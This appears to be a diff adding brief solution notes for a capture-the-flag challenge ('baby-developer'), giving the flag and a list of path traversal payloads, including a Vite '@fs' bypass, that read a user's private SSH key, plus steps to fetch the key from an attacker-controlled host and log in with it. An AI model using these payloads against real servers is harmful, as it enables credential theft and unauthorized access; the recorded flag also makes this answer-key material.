@@ -1,0 +1,17 @@
+Get key
+	URL: http://my-ip/exploit
+
+Save it as id_rsa
+
+ssh stypr@baby-developer.chal.acsc.asia -p2222 -i id_rsa
+```
+ACSC{weird_bugs_pwned_my_system_too_late_to_get_my_CVE}
+```
+
+======== Payloads ========
+
+Path Traversal
+	http://website/../../../../../home/stypr/.ssh/id_rsa
+	http://website/home/stypr/.ssh/id_rsa
+@fs (https://github.com/vitejs/vite/issues/2820)
+	http://website/@fs/home/stypr/.ssh/id_rsa
